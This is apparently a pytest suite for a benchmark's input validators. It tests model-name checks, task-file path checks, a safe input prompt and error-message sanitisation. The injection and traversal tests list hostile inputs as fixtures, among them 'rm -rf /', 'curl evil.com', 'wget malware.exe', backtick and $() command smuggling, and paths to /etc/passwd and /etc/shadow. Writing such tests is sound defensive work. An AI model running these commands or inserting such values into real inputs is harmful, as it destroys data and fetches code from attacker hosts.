#!/usr/bin/env python3
"""
Test suite for benchmark/validators.py security module.
"""

import pytest
from pathlib import Path
import tempfile
import os

from benchmark.validators import (
    ValidationError,
    validate_model_name,
    validate_task_file,
    get_safe_user_input,
    sanitize_error_message,
)


class TestValidateModelName:
    """Test cases for model name validation to prevent command injection."""
    
    def test_valid_model_names(self):
        """Test that valid model names pass validation."""
        valid_names = [
            "llama2",
            "codellama",
            "mistral",
            "mixtral",
            "deepseek-coder",
            "qwen2.5-coder",
            "llama2:13b",
            "codellama:latest",
            "ollama/llama2",
            "ollama/codellama:13b",
            "phi-2",
            "vicuna_v1.5",
        ]
        
        for name in valid_names:
            result = validate_model_name(name)
            assert result == name.strip()
    
    def test_command_injection_attempts(self):
        """Test that command injection attempts are blocked."""
        malicious_names = [
            "model; rm -rf /",
            "model && curl evil.com",
            "model || wget malware.exe",
            "model`whoami`",
            "model$(id)",
            "model > /etc/passwd",
            "model < /etc/shadow",
            "model | cat /etc/passwd",
            "model & background_command",
            "model\nmalicious_command",
            "model\rcarriage_return",
            "model\x00null_byte",
        ]
        
        for name in malicious_names:
            with pytest.raises(ValidationError) as exc_info:
                validate_model_name(name)
            assert "Invalid model name format" in str(exc_info.value) or \
                   "suspicious pattern" in str(exc_info.value)
    
    def test_directory_traversal_attempts(self):
        """Test that directory traversal attempts are blocked."""
        traversal_names = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "~/sensitive_file",
            "model/../../../etc",
        ]
        
        for name in traversal_names:
            with pytest.raises(ValidationError):
                validate_model_name(name)
    
    def test_empty_or_invalid_input(self):
        """Test that empty or invalid input is rejected."""
        invalid_inputs = [
            "",
            "   ",
            None,
        ]
        
        for input_val in invalid_inputs:
            with pytest.raises(ValidationError) as exc_info:
                validate_model_name(input_val)
            assert "non-empty string" in str(exc_info.value)
    
    def test_length_limit(self):
        """Test that overly long model names are rejected."""
        long_name = "a" * 257  # Exceeds 256 character limit
        
        with pytest.raises(ValidationError) as exc_info:
            validate_model_name(long_name)
        assert "too long" in str(exc_info.value)
    
    def test_whitespace_handling(self):
        """Test that whitespace is properly handled."""
        assert validate_model_name("  llama2  ") == "llama2"
        assert validate_model_name("\tcodellama\n") == "codellama"


class TestValidateTaskFile:
    """Test cases for task file path validation to prevent directory traversal."""
    
    def setup_method(self):
        """Set up test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.original_cwd = os.getcwd()
        os.chdir(self.temp_dir)
        
        # Create expected directory structure
        self.tasks_dir = Path("benchmark/tasks")
        self.tasks_dir.mkdir(parents=True)
        
        # Create test files
        self.valid_task = self.tasks_dir / "test_task.md"
        self.valid_task.write_text("# Test Task")
        
        self.txt_task = self.tasks_dir / "test.txt"
        self.txt_task.write_text("Test")
    
    def teardown_method(self):
        """Clean up test environment."""
        os.chdir(self.original_cwd)
        import shutil
        shutil.rmtree(self.temp_dir)
    
    def test_valid_task_files(self):
        """Test that valid task files pass validation."""
        valid_paths = [
            "benchmark/tasks/test_task.md",
            self.valid_task,
            str(self.valid_task),
            "benchmark/tasks/test.txt",
        ]
        
        for path in valid_paths:
            result = validate_task_file(path)
            assert result.exists()
            assert result.is_file()
    
    def test_directory_traversal_attempts(self):
        """Test that directory traversal attempts are blocked."""
        # Create a file outside the allowed directory
        outside_file = Path("../sensitive.md")
        outside_file.write_text("Sensitive")
        
        traversal_paths = [
            "../sensitive.md",
            "../../etc/passwd",
            "/etc/passwd",
            "benchmark/tasks/../../sensitive.md",
            "benchmark/tasks/../../../etc/passwd",
        ]
        
        for path in traversal_paths:
            with pytest.raises(ValidationError) as exc_info:
                validate_task_file(path)
            assert "must be within benchmark/tasks directory" in str(exc_info.value)
    
    def test_nonexistent_file(self):
        """Test that nonexistent files are rejected."""
        with pytest.raises(ValidationError) as exc_info:
            validate_task_file("benchmark/tasks/nonexistent.md")
        assert "does not exist" in str(exc_info.value)
    
    def test_directory_instead_of_file(self):
        """Test that directories are rejected."""
        subdir = self.tasks_dir / "subdir"
        subdir.mkdir()
        
        with pytest.raises(ValidationError) as exc_info:
            validate_task_file(str(subdir))
        assert "not a file" in str(exc_info.value)
    
    def test_invalid_extensions(self):
        """Test that files with invalid extensions are rejected."""
        invalid_file = self.tasks_dir / "script.py"
        invalid_file.write_text("print('hello')")
        
        with pytest.raises(ValidationError) as exc_info:
            validate_task_file(str(invalid_file))
        assert "Invalid task file extension" in str(exc_info.value)
    
    def test_file_size_limit(self):
        """Test that overly large files are rejected."""
        large_file = self.tasks_dir / "large.md"
        # Create a file larger than 10 MB
        large_file.write_text("x" * (11 * 1024 * 1024))
        
        with pytest.raises(ValidationError) as exc_info:
            validate_task_file(str(large_file))
        assert "too large" in str(exc_info.value)
    
    def test_empty_path(self):
        """Test that empty paths are rejected."""
        with pytest.raises(ValidationError) as exc_info:
            validate_task_file("")
        assert "cannot be empty" in str(exc_info.value)


class TestGetSafeUserInput:
    """Test cases for safe user input function."""
    
    def test_valid_input(self, monkeypatch):
        """Test that valid input is accepted."""
        monkeypatch.setattr('builtins.input', lambda _: 'y')
        result = get_safe_user_input("Continue? (y/n): ", ['y', 'n'])
        assert result == 'y'
    
    def test_invalid_then_valid_input(self, monkeypatch):
        """Test that invalid input is rejected until valid input is provided."""
        inputs = iter(['maybe', 'invalid', 'y'])
        monkeypatch.setattr('builtins.input', lambda _: next(inputs))
        
        result = get_safe_user_input("Continue? (y/n): ", ['y', 'n'])
        assert result == 'y'
    
    def test_max_attempts_exceeded(self, monkeypatch):
        """Test that max attempts triggers an error."""
        monkeypatch.setattr('builtins.input', lambda _: 'invalid')
        
        with pytest.raises(ValidationError) as exc_info:
            get_safe_user_input("Continue? (y/n): ", ['y', 'n'])
        assert "Max input attempts" in str(exc_info.value)
    
    def test_empty_valid_options(self):
        """Test that empty valid options list is rejected."""
        with pytest.raises(ValueError):
            get_safe_user_input("Input: ", [])
    
    def test_whitespace_handling(self, monkeypatch):
        """Test that whitespace in input is handled correctly."""
        monkeypatch.setattr('builtins.input', lambda _: '  y  ')
        result = get_safe_user_input("Continue? (y/n): ", ['y', 'n'])
        assert result == 'y'


class TestSanitizeErrorMessage:
    """Test cases for error message sanitization."""
    
    def test_known_error_types(self):
        """Test that known error types return generic messages."""
        test_cases = [
            (FileNotFoundError("sensitive/path/to/file"), "File not found"),
            (PermissionError("/etc/shadow access denied"), "Permission denied"),
            (ConnectionError("Connection to 192.168.1.1:22 failed"), "Connection failed"),
            (TimeoutError("Timeout connecting to internal.server:3306"), "Operation timed out"),
            (ValueError("Invalid value: password123"), "Invalid value provided"),
            (KeyError("Missing API key: sk-123456"), "Required key not found"),
        ]
        
        for error, expected_message in test_cases:
            result = sanitize_error_message(error)
            assert result == expected_message
            # Ensure sensitive info is not in the sanitized message
            assert str(error) not in result
    
    def test_unknown_error_types(self):
        """Test that unknown error types return generic message."""
        class CustomError(Exception):
            pass
        
        error = CustomError("Sensitive internal details")
        result = sanitize_error_message(error)
        assert result == "An error occurred during operation"
        assert "Sensitive" not in result
    
    def test_no_information_disclosure(self):
        """Test that no sensitive information is disclosed."""
        sensitive_errors = [
            FileNotFoundError("/home/user/secret_key.pem"),
            PermissionError("Database password incorrect: admin123"),
            ConnectionError("Failed to connect to internal.database.local"),
        ]
        
        for error in sensitive_errors:
            result = sanitize_error_message(error)
            assert "/home/user" not in result
            assert "secret_key" not in result
            assert "admin123" not in result
            assert "internal.database" not in result


class TestSecurityIntegration:
    """Integration tests for security validators."""
    
    def test_model_name_validation_integration(self):
        """Test model name validation in realistic scenarios."""
        # Simulate user trying various inputs
        test_scenarios = [
            ("llama2", True, "llama2"),
            ("ollama/codellama:13b", True, "ollama/codellama:13b"),
            ("model && rm -rf /", False, None),
            ("../../../etc/passwd", False, None),
            ("valid-model_name.v2", True, "valid-model_name.v2"),
        ]
        
        for input_name, should_pass, expected_output in test_scenarios:
            if should_pass:
                result = validate_model_name(input_name)
                assert result == expected_output
            else:
                with pytest.raises(ValidationError):
                    validate_model_name(input_name)
    
    def test_complete_validation_workflow(self, monkeypatch):
        """Test complete validation workflow for a benchmark task."""
        # Set up environment
        temp_dir = tempfile.mkdtemp()
        original_cwd = os.getcwd()
        os.chdir(temp_dir)
        
        try:
            # Create task structure
            tasks_dir = Path("benchmark/tasks")
            tasks_dir.mkdir(parents=True)
            task_file = tasks_dir / "test.md"
            task_file.write_text("# Test Task")
            
            # Validate model name
            model = validate_model_name("llama2")
            assert model == "llama2"
            
            # Validate task file
            task_path = validate_task_file("benchmark/tasks/test.md")
            assert task_path.exists()
            
            # Simulate user input
            monkeypatch.setattr('builtins.input', lambda _: 'y')
            response = get_safe_user_input("Continue? ", ['y', 'n'])
            assert response == 'y'
            
        finally:
            os.chdir(original_cwd)
            import shutil
            shutil.rmtree(temp_dir)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])